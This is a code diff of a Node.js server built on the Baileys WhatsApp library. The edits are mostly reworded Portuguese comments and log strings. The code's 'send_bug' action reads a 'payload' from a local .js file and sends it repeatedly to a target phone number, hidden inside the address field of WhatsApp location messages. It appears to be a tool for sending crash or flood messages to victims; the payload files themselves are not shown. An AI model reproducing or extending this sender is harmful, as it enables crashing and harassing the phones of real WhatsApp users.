@@ -141,7 +141,7 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo de Localização Nativa carregando exatamente o conteúdo dos arquivos .JS
+                // O script busca o arquivo correspondente no GitHub/Diretório pelo nome recebido
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivoBruto = extraData.file || "";
@@ -150,7 +150,6 @@ const server = http.createServer(async (req, res) => {
                     let conteudoPayload = "";
 
                     try {
-                        // Lista todos os arquivos da pasta para achar o arquivo .js correto (case-insensitive)
                         const arquivosNaPasta = fs.readdirSync(__dirname);
                         const arquivoProcurado = nomeArquivoBruto.toLowerCase().endsWith('.js') 
                             ? nomeArquivoBruto.toLowerCase() 
@@ -161,7 +160,7 @@ const server = http.createServer(async (req, res) => {
                         if (arquivoEncontrado) {
                             const caminhoAbsoluto = path.join(__dirname, arquivoEncontrado);
                             
-                            // Primeiro tenta carregar como módulo do Node.js
+                            // Tenta importar via módulo do Node.js
                             try {
                                 const nomeModulo = path.basename(arquivoEncontrado, '.js');
                                 delete require.cache[require.resolve(`./${nomeModulo}`)];
@@ -176,14 +175,12 @@ const server = http.createServer(async (req, res) => {
                                     }
                                 }
                             } catch (eMod) {
-                                // Se falhar o require, lê diretamente o texto do arquivo
+                                // Se o require falhar, lê o arquivo como texto direto
                             }
 
-                            // Se o require não extraiu a string, lê diretamente o arquivo com regex para pegar o valor da variável
+                            // Extrai o conteúdo bruto de dentro do arquivo caso o require não retorne
                             if (!conteudoPayload) {
                                 let textoBruto = fs.readFileSync(caminhoAbsoluto, 'utf8');
-                                
-                                // Extrai o texto de dentro das aspas/crases da constante
                                 const matchAspas = textoBruto.match(/(?:const|let|var)\s+\w+\s*=\s*[`"']([\s\S]*?)[`"'];?/);
                                 if (matchAspas && matchAspas[1]) {
                                     conteudoPayload = matchAspas[1];
@@ -192,23 +189,22 @@ const server = http.createServer(async (req, res) => {
                                 }
                             }
                         } else {
-                            console.error(`Arquivo não encontrado no diretório: ${nomeArquivoBruto}`);
+                            console.error(`Arquivo de carga não encontrado na raiz: ${nomeArquivoBruto}`);
                         }
                     } catch (err) {
-                        console.error("Erro ao processar o arquivo JS:", err.message);
+                        console.error("Erro ao ler o arquivo no repositório:", err.message);
                     }
 
                     if (!conteudoPayload) {
                         conteudoPayload = "Google Maps Location";
                     }
 
-                    // Limite para evitar que o pacote Protobuf estoure no Baileys
+                    // Limita o tamanho para evitar erro de buffer de mensagem no Baileys
                     const addressPayload = conteudoPayload.length > 30000 
                         ? conteudoPayload.substring(0, 30000) 
                         : conteudoPayload;
 
                     for (let i = 0; i < quantidade; i++) {
-                        // Envia como mensagem de Localização Nativa (Gera o cartão gráfico do Mapa)
                         await waSock.sendMessage(targetJid, {
                             location: {
                                 degreesLatitude: -23.550520,
@@ -222,7 +218,7 @@ const server = http.createServer(async (req, res) => {
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ sucesso: true, mensagem: `Envio de ${nomeArquivoBruto} concluído (${quantidade}x)!` }));
+                    res.end(JSON.stringify({ sucesso: true, mensagem: `Carga de ${nomeArquivoBruto} enviada (${quantidade}x)!` }));
                     return;
                 }
 
